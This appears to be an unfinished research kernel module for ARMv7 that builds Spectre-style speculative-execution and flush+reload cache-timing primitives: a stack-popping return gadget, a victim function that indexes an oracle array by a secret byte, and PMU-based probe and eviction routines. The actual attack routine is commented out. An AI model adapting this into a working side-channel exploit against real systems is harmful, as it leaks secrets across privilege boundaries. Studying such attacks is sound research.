
//#include <stdio.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
// #include <linux/perf_event.h>


#define ARMV7_PMCR_E (1 << 0)        /* Enable all counters */
#define ARMV7_PMCR_P (1 << 1)        /* Reset all counters */
#define ARMV7_PMCR_C (1 << 2)        /* Cycle counter reset */
#define ARMV7_PMCR_D (1 << 3)        /* Cycle counts every 64th cpu cycle */
#define ARMV7_PMCR_X (1 << 4)        /* Export to ETM */
#define ARMV7_PMCNTENSET_C (1 << 31) /* Enable cycle counter */
#define ARMV7_PMOVSR_C (1 << 31)     /* Overflow bit */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Parsa");
MODULE_DESCRIPTION("A simple example Linux module.");
MODULE_VERSION("0.01");

int oracle[30*8];
void gadget(void)
{
    // Change the retrun address.
    // Pop enough stuff from stack.
    // This function should return to main.
    // Shoudln't return to the victim_stuff.

    __asm__(
        "pop     {r0,r1,r2,r3,r4,r7,r14}\n\t"
        "mov	 lr,lr\n\t"
        "bx 	 lr\n\t");
}

void victim_stuff(char *secret_ptr)
{
    int a;
    gadget();
    printk("returned from gadget to victim_stuff\n");
    //Secret acceess.
    //Speculative execution should reach here. But no commited execution.
    char secret = *secret_ptr;
    int temp = oracle[secret * 32];
}

void time_init(void)
{
    int value = 0;
    unsigned int x = 0;

    value |= ARMV7_PMCR_E; // Enable all counters
    value |= ARMV7_PMCR_P; // Reset all counters
    value |= ARMV7_PMCR_C; // Reset cycle counter to zero
    value |= ARMV7_PMCR_X; // Enable export of events

    //value |= ARMV7_PMCR_D; // Enable div64

    // Performance Monitor Control Register
    asm volatile("MCR p15, 0, %0, c9, c12, 0" ::"r"(value));

    // Count Enable Set Register
    value = 0;
    value |= ARMV7_PMCNTENSET_C;

    for (x = 0; x < 4; x++)
    {
        value |= (1 << x); // Enable the PMx event counter
    }

    asm volatile("MCR p15, 0, %0, c9, c12, 1" ::"r"(value));

    // Overflow Flag Status register
    value = 0;
    value |= ARMV7_PMOVSR_C;

    for (x = 0; x < 4; x++)
    {
        value |= (1 << x); // Enable the PMx event counter
    }
    asm volatile("MCR p15, 0, %0, c9, c12, 3" ::"r"(value));
}

noinline int probe(char* add)
{
    unsigned int time1 = 0, time2 = 0, value = 0;

    //restarting timer
    time_init();

    asm volatile ("DSB");
    asm volatile ("ISB");
    //measuring time
    asm volatile ("MRC p15, 0, %0, c9, c13, 0\t\n": "=r"(time1));  
    asm volatile ("DSB");
    asm volatile ("ISB");

    //accessing
    asm volatile ("LDR %0, [%1]\n\t"
        : "=r" (value)
        : "r" (add)
        );

    
    asm volatile ("DSB");
    asm volatile ("ISB");
    //measuring time
    asm volatile ("MRC p15, 0, %0, c9, c13, 0\t\n": "=r"(time2));  
    asm volatile ("DSB");
    asm volatile ("ISB");

    return (time2 - time1);
}

/*
void clear_cache(char *begin, char *end)
{
    const int syscall = 0xf0002;

    __asm __volatile(
        "mov r0, %0\n"
        "mov r1, %1\n"
        "mov r3, %2\n"
        "mov r2, #0x0\n"
        "svc 0x00000000\n"
        :
        : "r"(begin), "r"(end), "r"(syscall)
        : "r0", "r1", "r3");
}
*/

void evict_cell(char *p)
{
    __asm __volatile("mcr p15, 0, %0, c7, c14, 1" ::"r"(p));
}

unsigned int get_time(void)
{
    unsigned int time = 0;
    __asm __volatile("MRC p15, 0, %0, c9, c13, 0\t\n"
                     : "=r"(time));
    return time;
}

// int __init attack(void)
// {
//     char secret[1];
//     //    victim_stuff(secret);
//     //    printf("Returned to main.\n");
//     //Comitted execution should return here from the gadget.

//     time_init();
//     printk("%d", get_time());
//     printk("%d", get_time());

//     //Clear oracle from the cache i.e fulsh.
//     //Measure each element's read time i.e reload.
// }

static void __exit main_exit(void)
{
    printk(KERN_INFO "Goodbye, World !\n");
}

static int __init main(void)
{

    
    printk("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");

		
	//clear_cache(oracle, &oracle[29]);
	
	int i=0;
	for (i=0;i<30;i++){
		evict_cell(&oracle[i*8]);
	}


	printk("-----------\n");
	for(i=0;i<30;i++){
		printk("%d: %d\n",i,probe(&oracle[i*8]));
	}
	printk("-----------\n");
	for(i=0;i<30;i++){
		printk("%d: %d\n",i,probe(&oracle[i*8]));
	}
	printk("-----------\n");
	for (i=0;i<30;i++){
		evict_cell(&oracle[i*8]);
	}
	printk("-----------\n");

	printk("i=3 First read time: %d\n",probe(&oracle[3*8]));
	printk("i=11 First read time: %d\n",probe(&oracle[11*8]));
	printk("i=27 First read time: %d\n",probe(&oracle[27*8]));

	for(i=0;i<30;i++){
		printk("%d: %d\n",i,probe(&oracle[i*8]));
	}
	
    // struct perf_event_attr pe;
    // int perf_event_fd, addr;
    // long long cpu_cycles;

    // memset(&pe, 0, sizeof(struct perf_event_attr));
    // pe.type = PERF_TYPE_HARDWARE;
    // pe.size = sizeof(struct perf_event_attr);
    // pe.config = PERF_COUNT_HW_CPU_CYCLES; //we are going to count the number of CPU cycles
    // pe.disabled = 1;
    // pe.exclude_kernel = 1;
    // pe.exclude_hv = 1;

    // perf_event_fd = perf_event_open(&pe, 0, -1, -1, 0);
    // if (perf_event_fd == -1)
    // {
    //     fprintf(stderr, "Error opening leader %llx\n", pe.config);
    //     exit(EXIT_FAILURE);
    // }

    // ioctl(perf_event_fd, PERF_EVENT_IOC_RESET, 0);
    // ioctl(perf_event_fd, PERF_EVENT_IOC_ENABLE, 0);

    // ioctl(perf_event_fd, PERF_EVENT_IOC_DISABLE, 0);
    // read(perf_event_fd, &cpu_cycles, sizeof(long long));

    // printf("%d\n", cpu_cycles);
}

module_init(main);
module_exit(main_exit);
